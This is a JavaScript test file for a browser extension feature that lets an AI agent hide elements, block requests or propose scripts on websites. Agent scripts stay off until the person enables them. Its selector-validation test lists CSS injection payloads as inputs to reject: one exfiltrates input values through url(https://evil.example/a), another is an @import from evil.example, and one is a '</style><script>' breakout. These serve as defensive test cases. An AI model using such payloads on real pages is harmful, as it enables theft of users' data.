// Site edits: what an agent may change on a site, and that the browser follows it. A script runs with the user's sign-in on
// every visit, so only the person turns one on; hide stays CSS that can only hide; block stays on its own site.
import assert from "node:assert/strict";
import { test } from "node:test";
import { installFakeChrome } from "./fake-chrome.mjs";

const store = await import("../src/site-edits/store.ts");
const empty = { edits: [], adBlock: false };

test("a site is a plain host, written one way", () => {
	assert.equal(store.normalizeHost("https://www.X.com/home"), "x.com");
	assert.equal(store.normalizeHost("news.example.co.uk."), "news.example.co.uk");
	for (const bad of ["", "localhost", "x", "javascript:alert(1)", "a b.com"]) assert.throws(() => store.normalizeHost(bad), store.SiteEditError, bad);
	assert.ok(store.onHost("https://m.x.com/a", "x.com"));
	assert.ok(!store.onHost("https://notx.com/a", "x.com"));
	assert.ok(!store.onHost("chrome://settings", "settings"));
});

test("hide takes selectors only, so an edit can't add CSS that reads the page", () => {
	assert.equal(store.checkSelectors(" .ad, [data-testid=sidebar] "), ".ad, [data-testid=sidebar]");
	for (const bad of [
		".a { display:block }",
		"input[value^=a] ~ x; background: url(https://evil.example/a)",
		"@import url(https://evil.example/x.css)",
		".a\\7b",
		"</style><script>",
		"",
	]) {
		assert.throws(() => store.checkSelectors(bad), store.SiteEditError, bad);
	}
	const s = store.added(empty, { host: "x.com", kind: "hide", value: ".ad", actor: "agent", who: "claude" }, "a1", 1).state;
	assert.equal(store.hideCss(s, "https://x.com/home"), ".ad { display: none !important; }");
	assert.equal(store.hideCss(s, "https://example.com/"), "", "only on its own site");
});

test("block never stops the page itself or works off its own site, and can't block everything", () => {
	const s = store.added(empty, { host: "news.example.com", kind: "block", value: "||ads.example.net^", actor: "agent", who: "c" }, "b1", 1).state;
	const [rule] = store.blockRules(s, 50000);
	assert.equal(rule.id, 50000);
	assert.deepEqual(rule.condition.initiatorDomains, ["news.example.com"]);
	assert.ok(!rule.condition.resourceTypes.includes("main_frame"));
	for (const bad of ["*", "||^", "|", "a b"]) assert.throws(() => store.checkPattern(bad), store.SiteEditError, bad);
});

test("an agent's script starts off, and only the person turns it on", () => {
	let s = store.added(empty, { host: "x.com", kind: "script", value: "document.title='x'", note: "rename", actor: "agent", who: "claude" }, "s1", 1).state;
	assert.equal(s.edits[0].on, false);
	assert.equal(s.edits[0].addedBy, "agent:claude");
	assert.throws(() => store.switched(s, "s1", true, "agent"), /Only the person/);
	s = store.switched(s, "s1", true, "person");
	assert.equal(s.edits[0].on, true);
	// An agent may always turn one off.
	assert.equal(store.switched(s, "s1", false, "agent").edits[0].on, false);
	// Hide and block from an agent are on at once: each is one click to undo.
	const h = store.added(empty, { host: "x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "h1", 1);
	assert.equal(h.edit.on, true);
});

test("the same edit twice is one edit, and there is a limit", () => {
	const once = store.added(empty, { host: "x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "1", 1).state;
	assert.equal(store.added(once, { host: "www.x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "2", 2).state.edits.length, 1);
	const full = { edits: Array.from({ length: store.MAX_EDITS }, (_, i) => ({ id: String(i) })), adBlock: false };
	assert.throws(() => store.added(full, { host: "x.com", kind: "hide", value: ".a", actor: "agent", who: "c" }, "z", 1), /already/);
});

test("the browser follows the edits: rules, ad blocking, sheets and scripts", async () => {
	const fake = installFakeChrome();
	const dynamic = new Map();
	const rulesets = new Set();
	const sheets = [];
	const scripts = new Map();
	Object.assign(globalThis.chrome, {
		declarativeNetRequest: {
			async getDynamicRules() {
				return [...dynamic.values()];
			},
			async updateDynamicRules({ removeRuleIds = [], addRules = [] }) {
				for (const id of removeRuleIds) dynamic.delete(id);
				for (const r of addRules) dynamic.set(r.id, r);
			},
			async getEnabledRulesets() {
				return [...rulesets];
			},
			async updateEnabledRulesets({ enableRulesetIds = [], disableRulesetIds = [] }) {
				for (const id of enableRulesetIds) rulesets.add(id);
				for (const id of disableRulesetIds) rulesets.delete(id);
			},
		},
		scripting: {
			async insertCSS(o) {
				sheets.push(["in", o.target.tabId, o.css]);
			},
			async removeCSS(o) {
				sheets.push(["out", o.target.tabId, o.css]);
			},
		},
		userScripts: {
			async execute() {
				return [];
			},
			async getScripts() {
				return [...scripts.values()];
			},
			async register(list) {
				for (const s of list) scripts.set(s.id, s);
			},
			async unregister({ ids }) {
				for (const id of ids) scripts.delete(id);
			},
		},
		permissions: { ...globalThis.chrome.permissions, onAdded: { addListener() {} } },
	});
	globalThis.chrome.webNavigation.getAllFrames = async ({ tabId }) => [{ frameId: 0, url: (await globalThis.chrome.tabs.get(tabId)).url }];
	// A rule of someone else's (the custom-provider CORS rules) is left alone.
	dynamic.set(2000, { id: 2000 });
	const tab = fake.addTab({ url: "https://x.com/home" });
	const apply = await import(`../src/site-edits/apply.ts?ctx=${Math.random()}`);
	const add = (input) => store.change((s) => {
		const r = store.added(s, input, store.newId(), Date.now());
		return { state: r.state, result: r.edit };
	});
	await add({ host: "x.com", kind: "hide", value: ".ad", actor: "agent", who: "c" });
	await add({ host: "x.com", kind: "block", value: "||ads.example.net^", actor: "agent", who: "c" });
	const script = await add({ host: "x.com", kind: "script", value: "1", actor: "agent", who: "c" });
	await store.change((s) => ({ state: { ...s, adBlock: true }, result: undefined }));
	await apply.syncSiteEdits();
	assert.ok(dynamic.has(2000), "someone else's rule stays");
	assert.ok(dynamic.has(apply.SITE_RULE_BASE));
	assert.ok(rulesets.has("ads"));
	assert.deepEqual(sheets.at(-1), ["in", tab, ".ad { display: none !important; }"]);
	assert.equal(scripts.size, 0, "a script waiting for the person never runs");
	await store.change((s) => ({ state: store.switched(s, script.id, true, "person"), result: undefined }));
	await apply.syncSiteEdits();
	assert.deepEqual(scripts.get(`site-edit-${script.id}`).matches, ["*://x.com/*", "*://*.x.com/*"]);
	await store.change((s) => ({ state: { edits: [], adBlock: false }, result: undefined }));
	await apply.syncSiteEdits();
	assert.equal(scripts.size, 0);
	assert.ok(!rulesets.has("ads"));
	assert.ok(!dynamic.has(apply.SITE_RULE_BASE));
	assert.deepEqual(sheets.at(-1), ["out", tab, ".ad { display: none !important; }"], "taking an edit back takes its sheet out of open tabs");
});
